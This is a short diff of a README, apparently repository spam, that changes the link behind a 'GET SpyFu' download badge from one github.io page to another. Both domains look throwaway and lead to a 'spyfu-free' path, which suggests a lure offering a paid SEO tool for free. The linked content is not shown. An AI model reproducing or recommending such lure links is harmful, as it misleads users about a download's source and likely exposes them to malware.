@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=a7effd2ae8796bf9efa56a3ce62cb515be451325-3727926-images-thumbs&n=13)
 
-[![GET SpyFu](https://img.shields.io/badge/GET%20%E2%80%94%20SpyFu-0078D6?style=for-the-badge&logoColor=white)](https://tpm-health-diagnostic-tools.github.io/.github/spyfu-free)
+[![GET SpyFu](https://img.shields.io/badge/GET%20%E2%80%94%20SpyFu-0078D6?style=for-the-badge&logoColor=white)](https://chasepersonzvvs.github.io/.github/spyfu-free)
 
 ---
 
